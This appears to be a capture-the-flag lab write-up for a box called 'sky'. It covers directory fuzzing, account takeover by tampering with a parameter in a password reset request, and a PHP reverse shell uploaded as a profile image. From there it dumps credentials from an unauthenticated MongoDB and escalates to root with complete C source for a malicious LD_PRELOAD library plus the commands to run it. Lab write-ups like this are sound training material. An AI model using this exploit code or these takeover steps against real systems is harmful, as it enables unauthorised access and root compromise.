We got some stuff in here, a `Track Order` functionality and a contact form, I tried `XSS` on the contact form but no luck, if we try `test` on the `Track Order`, we can see this:


![](cybersecurity/images/Pasted%2520image%252020250502152734.png)

We get this URL format:

```
http://10.10.167.2/v2/admin/track_orders?awb=test&srchorder=
```

Seems like there is a `v2` directory which may contain some sort of login page, let's fuzz and check it out:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.167.2/FUZZ" -ic -c -t 200 -e .php,.html,.git

If we go to `v2`, we can see this, let's register a test account:


![](cybersecurity/images/Pasted%2520image%252020250502152959.png)

Now, we can login with our test credentials:

![](cybersecurity/images/Pasted%2520image%252020250502153027.png)

![](cybersecurity/images/Pasted%2520image%252020250502153032.png)


We got a lot of options, If we go to our profile, we can notice this:


![](cybersecurity/images/Pasted%2520image%252020250502153146.png)

We got an admin email `admin@sky.thm`, if we check the options, we can notice this:

![](cybersecurity/images/Pasted%2520image%252020250502153207.png)

We got a `ResetUser` functionality, let's check it out:

![](cybersecurity/images/Pasted%2520image%252020250502153307.png)

We can reset passwords, let's proceed to exploitation.


# EXPLOITATION
---

If we submit a test password to our proxy, we can see the following request:


![](cybersecurity/images/Pasted%2520image%252020250502153425.png)

If we can modify the `uname` parameter, we can maybe perform `account takeover` on the admin user to set a new password:


![](cybersecurity/images/Pasted%2520image%252020250502153527.png)

It says password changed, let's try logging in the admin account:

![](cybersecurity/images/Pasted%2520image%252020250502153606.png)


![](cybersecurity/images/Pasted%2520image%252020250502153616.png)

There we go, account takeover worked, if we remember the `profile`, we can upload images, we can maybe embed a reverse shell and gain access:

![](cybersecurity/images/Pasted%2520image%252020250502153910.png)



![](cybersecurity/images/Pasted%2520image%252020250502154001.png)


If we click on `Edit Profile`, the request goes through, if we capture the request, we can get to know the destination path:

![](cybersecurity/images/Pasted%2520image%252020250502154228.png)

We need to go to `/v2/profileimages`

![](cybersecurity/images/Pasted%2520image%252020250502154317.png)

So, let's simply go to:

```
http://10.10.167.2/v2/profileimages/thm_shell.php
```

If we have our listener ready, we can receive the connection:


![](cybersecurity/images/Pasted%2520image%252020250502154354.png)

Let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---

First thing to do is to get a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](cybersecurity/images/Pasted%2520image%252020250502154453.png)

Let's use linpeas:

![](cybersecurity/images/Pasted%2520image%252020250502154957.png)

There are some suspicious connections on here, if we check what's the port `27017`
used for:

![](cybersecurity/images/Pasted%2520image%252020250502155127.png)

As seen, this port may be used by `mongodb`, let's go inside of it:


```
www-data@sky:/tmp$ mongo 127.0.0.1

        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()

> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB

```

We can do this:

```mongo
> use backup
> show collections
collection
user

> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

As seen, we got credentials:

```
webdeveloper:BahamasChapp123!@#
```

We can go into ssh with those:

![](cybersecurity/images/Pasted%2520image%252020250502155718.png)

We are now able to read `user.txt`:

```
webdeveloper@sky:~$ cat user.txt
63191e4ece37523c9fe6bb62a5e64d45
```

If we use `sudo -l`, we notice this:

```
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

There's a strange binary on here, the interesting stuff on here is the:

```
LD_PRELOAD
```

LD_PRELOAD is an environment variable in Linux that allows users to specify a shared library (.so file) to be loaded _before_ all other system libraries during program execution. This mechanism is typically used for debugging or overriding specific functions in existing libraries. However, in a security context, it can be abused for privilege escalation if an attacker controls the `LD_PRELOAD` variable and can execute a binary with elevated privileges (e.g., via sudo). By crafting a malicious shared library that defines functions with the same names as those used by the target binary (e.g., `system()`, `exec()`, or even constructor functions), an attacker can hijack the program’s execution flow. When the binary runs, it loads the attacker’s library first, executing arbitrary code with the privileges of the target process, in this case, root—due to the `sudo` permissions granted to `/usr/bin/sky_backup_utility`.


Knowing all this, we can get a root shell by doing this:

1. Creating a malicious `exploit.c` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BOLD "\033[1m"
#define RED  "\033[31m"
#define RESET "\033[0m"

void _init() {
    fprintf(stderr, BOLD RED"[+]" RESET" Unsetting LD_PRELOAD\n");
    unsetenv("LD_PRELOAD");

    fprintf(stderr, BOLD RED"[+]" RESET" Setting EUID/EGID to 0\n");
    if(setgid(0) < 0) { 
        perror("setgid"); 
        _exit(1); 
    }
    if(setuid(0) < 0) { 
        perror("setuid"); 
        _exit(1); 
    }
    
    fprintf(stderr, BOLD RED"[+]" RESET" Spawning root shell!\n");
    system("/bin/bash -p");
    fprintf(stderr, BOLD RED"[!]" RESET" Shell execution failed!\n");
    _exit(0);
}
```

2. Compiling it:

```
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```

3. Executing the Binary with LD_PRELOAD

```
sudo LD_PRELOAD=./exploit.so /usr/bin/sky_backup_utility
```

Once we use it, we get a root shell:

![](cybersecurity/images/Pasted%2520image%252020250502161151.png)

Let's get root flag and finish the CTF:

```
root@sky:/tmp# cat /root/root.txt
3a62d897c40a815ecbe267df2f533ac6
```
